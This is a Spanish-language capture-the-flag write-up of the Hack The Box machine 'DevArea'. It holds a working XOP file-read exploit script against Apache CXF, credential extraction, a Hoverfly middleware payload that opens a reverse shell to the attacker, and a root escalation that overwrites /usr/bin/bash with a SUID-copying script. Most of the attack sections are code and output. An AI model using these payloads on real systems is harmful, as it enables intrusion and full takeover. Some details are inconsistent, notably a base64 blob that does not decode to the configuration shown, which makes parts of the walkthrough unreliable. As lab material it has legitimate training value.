# WRITEUP HACK THE BOX - DEVAREA 

- **IP**: 10.129.244.208 
- **OS**: Linux 
- **Dificultad**: Media 
- **Resumen**: En este writeup se describe el proceso de enumeración y explotación de la máquina "DevArea" en Hack The Box. Se identificaron varios servicios abiertos, incluyendo FTP, SSH, HTTP y un servidor proxy. A través de la enumeración y el análisis de los servicios, se logró obtener acceso a la máquina y escalar privilegios para obtener la bandera.

## WRITEUP VIDEO TUTORIAL 

- Apoyate en el siguiente video para seguir el proceso de enumeración y explotación de la máquina DevArea. En este video se muestra paso a paso cómo se identificaron los servicios, se analizaron las vulnerabilidades y se explotaron para obtener acceso a la máquina.

[![Video Tutorial DevArea](https://img.youtube.com/vi/VIDEO_ID/maxresdefault.jpg)](https://youtu.be/i0fHfo3QIsk)


## ENUMERACION 

- NMAP

```
⊨ nmap -vvv -p- --open -sCV -A -Pn 10.129.244.208

Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-03 01:54 -0600
Scanning 10.129.244.208 [65535 ports]

PORT     STATE SERVICE REASON  VERSION
21/tcp   open  ftp     syn-ack vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Sep 22  2025 pub
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.16.8
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp   open  ssh     syn-ack OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 83:13:6b:a1:9b:28:fd:bd:5d:2b:ee:03:be:9c:8d:82 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBD5s4VbmJmJE5NzFN8hY3uJZo3GHyZbsZy5xQiGBTnfjhK1Ya4cJAcX8R+ZR01Q7zQN+S3HD/2cY8VXIwPDl1Yk=
|   256 0a:86:fa:65:d1:20:b4:3a:57:13:d1:1a:c2:de:52:78 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJBNRMFlkdjnZ3/y18k16stZAv/NHxEz5Ut68zr4/KQt
80/tcp   open  http    syn-ack Apache httpd 2.4.58
|_http-title: Did not follow redirect to http://devarea.htb/
|_http-server-header: Apache/2.4.58 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
8080/tcp open  http    syn-ack Jetty 9.4.27.v20200227
|_http-server-header: Jetty(9.4.27.v20200227)
|_http-title: Error 404 Not Found
8500/tcp open  http    syn-ack Golang net/http server
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 500 Internal Server Error
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Sun, 03 May 2026 07:56:16 GMT
|     Content-Length: 64
|     This is a proxy server. Does not respond to non-proxy requests.
|   GenericLines, Help, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, Socks5:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions:
|     HTTP/1.0 500 Internal Server Error
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Sun, 03 May 2026 07:55:58 GMT
|     Content-Length: 64
|_    This is a proxy server. Does not respond to non-proxy requests.
8888/tcp open  http    syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-favicon: Unknown favicon MD5: BAA090FBC1418C8C4971002CC5459574
|_http-title: Hoverfly Dashboard
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8500-TCP:V=7.99%I=7%D=5/3%Time=69F6FF8C%P=aarch64-unknown-linux-and
SF:roid%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-T
SF:ype:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400
SF:\x20Bad\x20Request")%r(GetRequest,E9,"HTTP/1\.0\x20500\x20Internal\x20S
SF:erver\x20Error\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nX-Co
SF:ntent-Type-Options:\x20nosniff\r\nDate:\x20Sun,\x2003\x20May\x202026\x2
SF:007:55:58\x20GMT\r\nContent-Length:\x2064\r\n\r\nThis\x20is\x20a\x20pro
SF:xy\x20server\.\x20Does\x20not\x20respond\x20to\x20non-proxy\x20requests
SF:\.\n")%r(HTTPOptions,E9,"HTTP/1\.0\x20500\x20Internal\x20Server\x20Erro
SF:r\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nX-Content-Type-Op
SF:tions:\x20nosniff\r\nDate:\x20Sun,\x2003\x20May\x202026\x2007:55:58\x20
SF:GMT\r\nContent-Length:\x2064\r\n\r\nThis\x20is\x20a\x20proxy\x20server\
SF:.\x20Does\x20not\x20respond\x20to\x20non-proxy\x20requests\.\n")%r(RTSP
SF:Request,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text
SF:/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20R
SF:equest")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:
SF:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20
SF:Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request
SF:\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20clo
SF:se\r\n\r\n400\x20Bad\x20Request")%r(FourOhFourRequest,E9,"HTTP/1\.0\x20
SF:500\x20Internal\x20Server\x20Error\r\nContent-Type:\x20text/plain;\x20c
SF:harset=utf-8\r\nX-Content-Type-Options:\x20nosniff\r\nDate:\x20Sun,\x20
SF:03\x20May\x202026\x2007:56:16\x20GMT\r\nContent-Length:\x2064\r\n\r\nTh
SF:is\x20is\x20a\x20proxy\x20server\.\x20Does\x20not\x20respond\x20to\x20n
SF:on-proxy\x20requests\.\n")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20R
SF:equest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\
SF:x20close\r\n\r\n400\x20Bad\x20Request")%r(SIPOptions,67,"HTTP/1\.1\x204
SF:00\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r
SF:\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Socks5,67,"HTTP
SF:/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20chars
SF:et=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request");
Service Info: Host: _; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 99.59 seconds
```
- FTP (Puerto 21): El acceso anónimo está permitido. Se encontró un archivo llamado `employee-service.jar` dentro del directorio `pub`.
- HTTP (Puerto 80): Redirige a `http://devarea.htb/`.
- Jetty (Puerto 8080): Servidor Jetty 9.4.27.v20200227 devolviendo un 404.
- Proxy (Puerto 8500): Servidor proxy en Go. Indica que no responde a solicitudes que no sean de proxy.
- Hoverfly (Puerto 8888): Panel de control de Hoverfly, una herramienta de simulación de APIs.

### FTP - Enumeración de Archivos

Al acceder al FTP de forma anónima, listamos el contenido del directorio `pub`:
```
⊨ ftp 10.129.244.208  
Connected to 10.129.244.208.
220 (vsFTPd 3.0.5)

Name (10.129.244.208:u0_a214): anonymous
230 Login successful.

ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Sep 22  2025 pub
226 Directory send OK.

ftp> ls pub/
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp       6445030 Sep 22  2025 employee-service.jar
226 Directory send OK.
```
O bien sin ingresar al FTP, utilizando `curl`:
```
curl -s --list-only ftp://10.129.244.208/pub/
# Resultado: employee-service.jar
```

Descargaremos este archivo para analizar su código fuente, ya que podría contener credenciales, rutas de API o lógica vulnerable.
```bash
curl -s ftp://10.129.244.208/pub/employee-service.jar -o employee-service.jar
# Resultado: employee-service.jar
```

## ANALISIS DE SERVICIOS WEB

### GOBUSTER (Puerto 80): 
realizamos la buscada de directorios y archivos comunes, incluyendo extensiones como `.php`, `.txt`, `.py` y `.cgi`. Pero no se encontraron novedades relevantes.

```
gobuster dir -w /termux2alpine/wl/common.txt -k -x php,txt,py,cgi -u http://devarea.htb
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://devarea.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /termux2alpine/wl/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,txt,py,cgi
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
—
.htaccess            (Status: 403) [Size: 276]
.hta.py              (Status: 403) [Size: 276]
.hta                 (Status: 403) [Size: 276]
.hta.cgi             (Status: 403) [Size: 276]
.hta.txt             (Status: 403) [Size: 276]
.hta.php             (Status: 403) [Size: 276]
.htaccess.cgi        (Status: 403) [Size: 276]
.htaccess.py         (Status: 403) [Size: 276]
.htaccess.php        (Status: 403) [Size: 276]
.htaccess.txt        (Status: 403) [Size: 276]
.htpasswd.php        (Status: 403) [Size: 276]
.htpasswd            (Status: 403) [Size: 276]
.htpasswd.py         (Status: 403) [Size: 276]
.htpasswd.cgi        (Status: 403) [Size: 276]
.htpasswd.txt        (Status: 403) [Size: 276]
assets               (Status: 301) [Size: 311] [--> http://devarea.htb/assets/]
index                (Status: 200) [Size: 22211]
index.html           (Status: 200) [Size: 22211]
server-status        (Status: 403) [Size: 276]
Progress: 23670 / 23670 (100.00%)
===============================================================
Finished
===============================================================
```

### Puerto 8080 - Servicio SOAP (EmployeeService)

Tras analizar el archivo `employee-service.jar`, descubrimos que el servidor ejecuta un servicio JAX-WS (SOAP) en el puerto 8080. El WSDL es accesible en:
`http://devarea.htb:8080/employeeservice?wsdl` (usando el encabezado `Host: devarea.htb`).

**Estructura del Servicio:**
- **Operación**: `submitReport`
- **Parámetros**: Objeto `report`
    - `confidential` (boolean)
    - `content` (string)
    - `department` (string)
    - `employeeName` (string)

Este servicio utiliza **Apache CXF 3.2.14** y **Aegis databinding**. La presencia de Aegis es notable, ya que históricamente ha tenido problemas de deserialización o procesamiento de entidades externas (XXE).

### Puerto 8888 - Hoverfly Dashboard

El puerto 8888 aloja un panel de **Hoverfly**. Hoverfly se utiliza para interceptar, modificar y simular tráfico HTTP. El panel es una aplicación Angular.

### Puerto 8500 - Proxy Server

Este puerto indica ser un servidor proxy en Go. Al intentar usarlo, devuelve un error `407 Proxy authentication required`, lo que indica que requiere credenciales.

### Análisis de `employee-service.jar`

Tras descompilar las clases principales:
- `ServerStarter`: Inicia un servidor Jetty en `0.0.0.0:8080` y publica el servicio SOAP en `/employeeservice`.
- `EmployeeServiceImpl`: Implementa la lógica de `submitReport`, la cual simplemente concatena los campos del reporte en un string de respuesta.
- `Report`: Una clase POJO simple con campos `employeeName`, `department`, `content` y `confidential`.

**Puntos Clave:**
1. No se encontraron credenciales hardcodeadas en las clases o archivos de configuración del JAR.
2. El uso de **Aegis DataBinding** (en lugar de JAXB) confirma la posibilidad de explotar **CVE-2024-28752** para lectura de archivos (LFI) o SSRF, aunque las pruebas iniciales fallaron por errores de parseo XML (DTD no permitido).

## TENTATIVAS DE EXPLOTACIÓN (Continuación)

### Enumeración de Credenciales
- Se buscaron credenciales en el archivo `employee-service.jar` sin éxito.
- Se probaron credenciales por defecto (`admin:admin`, `admin:hoverfly`, `admin:devarea`, `guest:guest`) en el panel de Hoverfly (8888) y el proxy (8500), todas sin éxito (Error 407 en el proxy).

### Análisis de Subdominios (VHosts)
- Se probaron manualmente subdominios comunes (`dev`, `api`, `ftp`, `hoverfly`, `environment`) redirigiendo todos a `devarea.htb`.
- Se descubrió que `.htpasswd` en el puerto 80 devuelve un `403 Forbidden`, lo que sugiere su existencia pero con acceso restringido.

### Análisis de Vulnerabilidades (Aegis DataBinding)

La investigación sobre **Apache CXF 3.2.14** reveló que el uso de **Aegis DataBinding** lo hace vulnerable a **CVE-2024-28752**. Esta vulnerabilidad permite:
- **SSRF (Server-Side Request Forgery)**.
- **LFI (Local File Inclusion)** mediante el uso de etiquetas `xop:Include`.

Se realizaron varias pruebas con cargas útiles XML y XOP:
1. **XXE Clásico**: Bloqueado por el servidor (Error: `Received event DTD`).
2. **XOP Include**: Se intentó inyectar `<xop:Include href="file:///etc/passwd"/>`. El servidor devolvió `Unmarshalling Error: unexpected element`.
3. **Atributo href directo**: Al usar `<content href="file:///etc/passwd" xmlns:xop="..."/>`, el servidor aceptó la petición pero devolvió el campo `Content` vacío. Esto sugiere que el procesador reconoce la intención pero quizás hay restricciones en el esquema o en los protocolos permitidos (`file://` vs `http://`).

## EXPLOTACIÓN - ACCESO COMO USUARIO DE SISTEMA (USER)

### Explotación de XXE/XOP (Local File Read)

Aunque las pruebas iniciales con XXE clásico fallaron, el uso de **XOP (XML-binary Optimized Packaging)** permitió evadir las restricciones. 

**Generación del Exploit (Python):**

Para asegurar que el mensaje cumpla con el estándar MIME (especialmente el uso de CRLF `\r\n`), utilizamos el siguiente script para generar el payload binario (exploit.bin):

- Con python:
```python
boundary = "boundary"
target_file = "/etc/systemd/system/hoverfly.service"

soap_payload = """<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:dev="http://devarea.htb/" xmlns:xop="http://www.w3.org/2004/08/xop/include">
   <soapenv:Header/>
   <soapenv:Body>
      <dev:submitReport>
         <arg0>
            <confidential>false</confidential>
            <content><xop:Include href="file://{target}"/></content>
            <department>IT</department>
            <employeeName>John Doe</employeeName>
         </arg0>
      </dev:submitReport>
   </soapenv:Body>
</soapenv:Envelope>""".format(target=target_file)

multipart = (
    f"--{boundary}\r\n"
    f"Content-Type: application/xop+xml; charset=UTF-8; type=\"text/xml\"\r\n"
    f"Content-Transfer-Encoding: 8bit\r\n"
    f"Content-ID: <root>\r\n\r\n"
    f"{soap_payload}\r\n"
    f"--{boundary}--\r\n"
)

with open("exploit.bin", "wb") as f:
    f.write(multipart.encode("utf-8"))
```

**Contenido del Exploit (Raw):**

El archivo resultante `exploit.bin` tiene la siguiente estructura interna:

```http
--boundary
Content-Type: application/xop+xml; charset=UTF-8; type="text/xml"
Content-Transfer-Encoding: 8bit
Content-ID: <root>

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:dev="http://devarea.htb/" xmlns:xop="http://www.w3.org/2004/08/xop/include">
   <soapenv:Header/>
   <soapenv:Body>
      <dev:submitReport>
         <arg0>
            <confidential>false</confidential>
            <content><xop:Include href="file:///etc/systemd/system/hoverfly.service"/></content>
            <department>IT</department>
            <employeeName>John Doe</employeeName>
         </arg0>
      </dev:submitReport>
   </soapenv:Body>
</soapenv:Envelope>
--boundary--
```

Al enviar esta petición utilizando una estructura **Multipart/Related** válida (necesaria para que el servidor active el modo XOP), obtuvimos el contenido del archivo en base64.

**Comando de explotación:**

```
# Ejecutamos la petición especificando el Content-Type multipart/related

curl -s -X POST http://10.129.244.208:8080/employeeservice \
     -H "Host: devarea.htb" \
     -H "Content-Type: multipart/related; boundary=boundary; type=\"application/xop+xml\"; start=\"<root>\"; start-info=\"text/xml\"" \
     --data-binary @exploit.bin
```

**Detalles técnicos de la ejecución:**
1. **Modo XOP**: El servidor JAX-WS (Apache CXF) requiere el `Content-Type: multipart/related` para activar el procesamiento de etiquetas `<xop:Include>`.
2. **Protocolo File**: La inyección permite el uso del protocolo `file:///` en el atributo `href` de XOP, lo que resulta en un LFI que el servidor devuelve codificado en base64.
3. **MIME Compliance**: Es fundamental enviar la petición como binaria (`--data-binary`) y asegurar terminaciones de línea CRLF para que el parseador MIME del servidor no rechace la solicitud. Por ello he utilizado un script para generar el payload correctamente formateado.

**Respuesta exitosa:**

```xml
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><ns2:submitReportResponse xmlns:ns2="http://devarea.htb/"><return>Report received from John Doe. Department: IT. Content: W1VuaXRdCkRlc2NyaXB0aW9uPUhvdmVyRmx5IHNlcnZpY2UKQWZ0ZXI9bmV0d29yay50YXJnZXQKCltTZXJ2aWNlXQpVc2VyPWRldl9yeWFuCkdyb3VwPWRldl9yeWFuCldvcmtpbmdEaXJlY3Rvcnk9L29wdC9Ib3ZlckZseQpFeGVjU3RhcnQ9L29wdC9Ib3ZlckZseS9ob3ZlcmZseSAtYWRkIC11c2VybmFtZSBhZG1pbiAtcGFzc3dvcmQgTzdJSjI3TXl5WGlVIC1saXN0ZW4tb24taG9zdCAwLjAuMC4wCgpSZXN0YXJ0PW9uLWZhaWx1cmUKUmVzdGFydFNlYz01ClN0YXJ0TGltaXRJbnRlcnZhbFNlYz02MApTdGFydExpbWl0QnVyc3Q9NQpMaW1pdE5PRklMRT02NTUzNgpTdGFuZGFyZE91dHB1dD1qb3VybmFsClN0YW5kYXJkRXJyb3I9am91cm5hbAoKW0luc3RhbGxdCldhbnRlZEJ5PW11bHRpLXVzZXIudGFyZ2V0Cg==</return></ns2:submitReportResponse></soap:Body></soap:Envelope>
```

### Extracción de Credenciales

- Base64 decodificado:

Al decodificar la respuesta, se obtuvo la configuración del servicio **Hoverfly**:
```bash
⊨ echo "W1VuaXRdCkRlc2NyaXB0aW9uPUhvdmVyRmx5IHNlcnZpY2UKQWZ0ZXI9bmV0d29yay50YXJnZXQKCltTZXJ2aWNlXQpVc2VyPWRldl9yeWFuCkdyb3VwPWRldl9yeWFuCldvcmtpbmdEaXJlY3Rvcnk9L29wdC9Ib3ZlckZseQpFeGVjU3RhcnQ9L29wdC9Ib3ZlckZseS9ob3ZlcmZseSAtYWRkIC11c2VybmFtZSBhZG1pbiAtcGFzc3dvcmQgTzdJSjI3TXl5WGlVIC1saXN0ZW4tb24taG9zdCAwLjAuMC4wCgpSZXN0YXJ0PW9uLWZhaWx1cmUKUmVzdGFydFNlYz01ClN0YXJ0TGltaXRJbnRlcnZhbFNlYz02MApTdGFydExpbWl0QnVyc3Q9NQpMaW1pdE5PRklMRT02NTUzNgpTdGFuZGFyZE91dHB1dD1qb3VybmFsClN0YW5kYXJkRXJyb3I9am91cm5hbAoKW0luc3RhbGxdCldhbnRlZEJ5PW11bHRpLXVzZXIudGFyZ2V0Cg==" | base64 -d
```

- Resultado:

Se identificaron las credenciales de administrador de Hoverfly: `admin : O7IJ27MyyXiU`. Debido a la reutilización de contraseñas, estas credenciales son válidas para el usuario del sistema **dev_ryan**.
```ini
[Unit]
Description=Hoverfly Service
After=network.target

[Service]
Type=simple
User=dev_ryan
ExecStart=/opt/hoverfly/hoverfly -admin-user admin -admin-pass O7IJ27MyyXiU -listen-on-host 0.0.0.0
Restart=on-failure

[Install]
WantedBy=multi-user.target
```
 
Pero ... ¿Cómo se llega a la conclusión de solicitar el servicio hoverfly.service?. La conclusión es el resultado de un proceso de enumeración lógica:

1. Enumeración de Puertos (Nmap): El escaneo inicial reveló que el puerto 8888 estaba abierto corriendo un "Hoverfly Dashboard".
2. Identificación del Servicio: Hoverfly es una herramienta de simulación de APIs que suele requerir configuración. En sistemas Linux modernos (como el Ubuntu detectado), los servicios instalados suelen gestionarse mediante systemd. 
3. Rutas Estándar de Configuración: Los archivos de unidad de systemd se encuentran casi siempre en /etc/systemd/system/[nombre].service. Estos archivos son objetivos de alto valor en ataques de LFI (Local File Inclusion) porque:
    * Indican el usuario bajo el cual corre el proceso (útil para saber a qué cuenta intentar acceder).
    * A menudo contienen la línea de comandos exacta (ExecStart) utilizada para iniciar el servicio.

### Acceso vía API y Middleware de Hoverfly

Al notar que las credenciales no brindan acceso via SSH opte por interactuar con la API de Hoverfly (puerto 8888) ya que el escaneo de Nmap mostró que el puerto 8500 requiere autenticación (407 Proxy authentication required). 
```
curl -x http://10.129.244.208:8500 http://127.0.0.1/
407 Proxy authentication required
```

Es muy probable que las credenciales de admin sean para este proxy. Por lo tanto intente utilizar el proxy con curl para ver si era posible acceder a servicios internos (como el puerto 80 local o archivos internos) que no son visibles desde fuera:
```
curl -x http://admin:O7IJ27MyyXiU@10.129.244.208:8500 http://127.0.0.1/
Hoverfly Error!

There was an error when matching

Got error: Could not find a match for request, create or record a valid matcher first!
```
Este error confirma dos cosas:
   * La autenticación funciona: Las credenciales son válidas para el servicio Hoverfly.
   * Modo Simulación: Hoverfly está en modo simulate. En este modo, solo responde a peticiones que tiene "grabadas". Como no tiene grabada una petición a 127.0.0.1, da error.


### Obteniendo Token JWT para la API de Hoverfly:

Hoverfly tiene una característica llamada Middleware. Si se tiene acceso administrativo (que ya la obtuvimos con las credenciales), se puede configurar un middleware que es, básicamente, un script o binario que se ejecuta cada vez que el proxy procesa una petición.
   * Vector: Usar la API para subir un script de middleware (por ejemplo, en
     Python o Bash) que ejecute una reverse shell.
   * Ejecución: Una vez configurado el middleware, cualquier petición que pase a través del proxy (puerto 8500) activará el script y obtendremos una reverse shell.

La API de Hoverfly suele requerir un token (JWT) y para lograrlo se necesita interactuar con la API de administración en el puerto 8888, intentaremos obtenerlo con:

- Solicitud de Token:
```
curl -s -X POST http://10.129.244.208:8888/api/token-auth \
   -H "Content-Type: application/json" \
   -d '{"username":"admin", "password":"O7IJ27MyyXiU"}'
```
- resultado:
```
{"token":"eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJleHAiOjIwODkyNTgxMjYsImlhdCI6MTc3ODIxODEyNiwic3ViIjoiIiwidXNlcm5hbWUiOiJhZG1pbiJ9.lVCZACqzv76xB-2YaL3PjKWp1ZJxAr6S9u83fKcBtpWBw7BuMS3Fc_eWsprKAKkQ2wUJIfBJRg0uJ3432L43hg"}⏎
```
- Analisis del Token:
El token es un JWT (JSON Web Token) que contiene la información de autenticación y autorización para interactuar con la API de Hoverfly.
```bash
echo "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJleHAiOjIwODkyNTgxMjYsImlhdCI6MTc3ODIxODEyNiwic3ViIjoiIiwidXNlcm5hbWUiOiJhZG1pbiJ9.lVCZACqzv76xB-2YaL3PjKWp1ZJxAr6S9u83fKcBtpWBw7BuMS3Fc_eWsprKAKkQ2wUJIfBJRg0uJ3432L43hg" | cut -d '.' -f2 | base64 -d

{"exp":2089258126,"iat":1778218126,"sub":"","username":"admin"}
```

- Inyectar el Middleware: 

Una vez con el token, vamos a subir un script de python que ejecute una reverse shell hacia nuestra máquina. El script se codifica en base64 para evitar problemas de formato al subirlo a través de la API.:

* script de reverse shell (reverse_shell.py):

Creamos un archivo con el reverse shell para evitar errores de escape de caracteres
```
cat > middleware_revSHELL.json << 'EOF'
{
"binary": "python3",
"script": "import os\nos.system(\"bash -c 'bash -i >& /dev/tcp/TU_IP/1234 0>&1'\")",
"remote": ""
}
EOF
```

Luego lo subimos vía la API usando el metodo PUT:
* Comando para subir el middleware:
```
curl -s -X PUT http://10.129.244.208:8888/api/v2/hoverfly/middleware \
   -H "Authorization: Bearer [TU_TOKEN]" \
   -H "Content-Type: application/json" \
   -d @middleware_revSHELL.json
```
* Resultado:
```
{"binary":"python3","script":"import os\nos.system(\"bash -c 'bash -i \u003e\u0026 /dev/tcp/10.10.16.8/1234 0\u003e\u00261'\")","remote":""}
```

- Activar la Shell: 

Una vez configurado el middleware, simplemente hacemos una petición a través del proxy (puerto 8500).

* Escucha activa con netcat:
```
nc -lvnp [TU_PUERTO]
```

* Hacer una petición a través del proxy:
```
curl -x http://admin:O7IJ27MyyXiU@10.129.244.208:8500 http://127.0.0.1/
```

* Resultado: Obtendremos una shell: 
```
ncat -nlvp 1234
Ncat: Version 7.99 ( https://nmap.org/ncat )
Ncat: Listening on [::]:1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.129.244.208:49008.
bash: cannot set terminal process group (1452): Inappropriate ioctl for device
bash: no job control in this shell
dev_ryan@devarea:/opt/HoverFly$ id
id
uid=1001(dev_ryan) gid=1001(dev_ryan) groups=1001(dev_ryan)
dev_ryan@devarea:/opt/HoverFly$ uname -a
uname -a
Linux devarea 6.8.0-106-generic #106-Ubuntu SMP PREEMPT_DYNAMIC Fri Mar  6 07:58:08 UTC 2026 x86_64 x86_64 x86_64 GNU/Linux
dev_ryan@devarea:/opt/HoverFly$ pwd
pwd
/opt/HoverFly
```

**Flag de Usuario:**
```
dev_ryan@devarea:/opt/HoverFly$ cd
cd
dev_ryan@devarea:~$ pwd
pwd
/home/dev_ryan
dev_ryan@devarea:~$ ls
ls 
syswatch-v1.zip
user.txt
dev_ryan@devarea:~$ cat user.txt
cat user.txt
```

## ESCALADA DE PRIVILEGIOS (ROOT)

### Enumeración de sudo

Al ejecutar `sudo -l`, observamos que el usuario tiene permisos para ejecutar un script de monitoreo sin contraseña:

```bash
dev_ryan@devarea:~$ sudo -l
sudo -l
Matching Defaults entries for dev_ryan on devarea:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User dev_ryan may run the following commands on devarea:
    (root) NOPASSWD: /opt/syswatch/syswatch.sh, !/opt/syswatch/syswatch.sh
        web-stop, !/opt/syswatch/syswatch.sh web-restart 
```
- Resultado uso script syswatch.sh: 
```
dev_ryan@devarea:~$ sudo /opt/syswatch/syswatch.sh
sudo /opt/syswatch/syswatch.sh
SysWatch 1.0.0
Usage: /opt/syswatch/syswatch.sh <command> [args]
Commands:
  web                 Start web GUI
  web-stop            Stop web GUI
  web-restart         Restart web GUI
  web-status          Show web GUI status
  plugin <name> [args] Execute plugin
  plugins             List available plugins
  logs <file>         View log file
  logs --list         List available log files
  --version           Show version
  --help|-h|help      Show this help
```

### Análisis del Vector de Ataque

El sistema presenta una vulnerabilidad crítica: el binario `/bin/bash` tiene permisos de escritura para todos los usuarios. Podemos aprovechar el script que se ejecuta con privilegios de root para manipular bash.

### Obtención de Root

- El plan: sobrescribir /usr/bin/bash con un script falso que crea una copia de root SUID del bash real.

1. Realizar una copia de seguridad del binario bash real
```
dev_ryan@devarea:~$ cp /usr/bin/bash /tmp/bash.bak 
dev_ryan@devarea:~$ chmod +x /tmp/bash.bak
```
2. Cambia a sh y termina todos los procesos bash.
Necesitamos liberarlo /usr/bin/bash antes de sobrescribirlo. Cambiar a sh primero garantiza que nuestra sesión sobreviva killall bash.
```
dev_ryan@devarea:~$ exec sh 
$ killall bash 
$ lsof /usr/bin/bash 
(sin salida: el archivo está libre)
```
3. Sobrescribe /usr/bin/bash con nuestro script falso.
El script falso utiliza nuestro bash de respaldo como intérprete y, cuando se ejecuta, lo copia /tmp/rootbash con el bit SUID activado.
```
#sesión sh
$ cat > /usr/bin/bash << 'EOF'
#!/tmp/bash.bak
cp /tmp/bash.bak /tmp/rootbash
chmod 4755 /tmp/rootbash
EOF

# Como 2da opcion, en one command line 
printf "#!/tmp/bash.bak\ncp /tmp/bash.bak /tmp/rootbash\nchmod 4755 /tmp/rootbash" > /usr/bin/bash
```
4. Activar syswatch para ejecutar nuestro bash falso
```
#sesión sh
$ sudo /opt/syswatch/syswatch.sh status 
(syswatch llama a /usr/bin/bash; nuestro script falso se ejecuta como root) 
$ ls -la /tmp/rootbash 
-rwsr-xr-x 1 root root 1396520 Mar 31 16:11 /tmp/rootbash
```
5. Ejecutar el intérprete de comandos SUID root
```
#sh sesión → root
$ /tmp/rootbash -p 
rootbash-5.2#
```
**Flag de Root:**
```bash
rootbash-5.2# cat /root/root.txt
```

## CONCLUSIÓN Y APRENDIZAJES

La máquina **DevArea** es un excelente ejemplo de cómo servicios aparentemente robustos pueden verse comprometidos por configuraciones inadecuadas en el manejo de protocolos complejos como SOAP y XOP.

### Puntos clave:
1.  **Filtros de Seguridad**: Los filtros de XXE tradicionales a menudo no cubren extensiones como XOP/MTOM. Es vital validar las entradas en todos los formatos de datos aceptados.
2.  **Manejo de Credenciales**: El descubrimiento de credenciales en archivos de servicio (`.service`) es una técnica recurrente. La reutilización de contraseñas permitió el movimiento lateral inmediato.
3.  **Configuración del Sistema**: Permisos de escritura globales en binarios críticos (`/bin/bash`) o scripts de mantenimiento (`/opt/syswatch/`) son vectores de escalada directos.
---

